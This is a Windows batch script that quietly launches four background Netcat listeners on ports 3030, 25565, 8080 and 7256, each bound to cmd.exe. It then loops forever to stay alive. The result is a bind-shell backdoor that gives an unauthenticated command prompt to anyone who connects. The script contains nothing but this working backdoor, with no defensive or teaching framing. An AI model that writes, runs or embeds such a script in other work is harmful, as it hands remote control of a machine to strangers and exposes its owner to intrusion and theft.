@echo off


REM Start a Netcat listener on port 3030 in the background
START /B nc.exe -l -p 3030 -e cmd.exe

REM Start a Netcat listener on port 25565 in the background
START /B nc.exe -l -p 25565 -e cmd.exe

REM Start a Netcat listener on port 8080 in the background
START /B nc.exe -l -p 8080 -e cmd.exe

REM Start a Netcat listener on port 7256 in the background
START /B nc.exe -l -p 7256 -e cmd.exe

REM Keep the batch file running indefinitely
:loop
timeout /t 1 > NUL
goto loop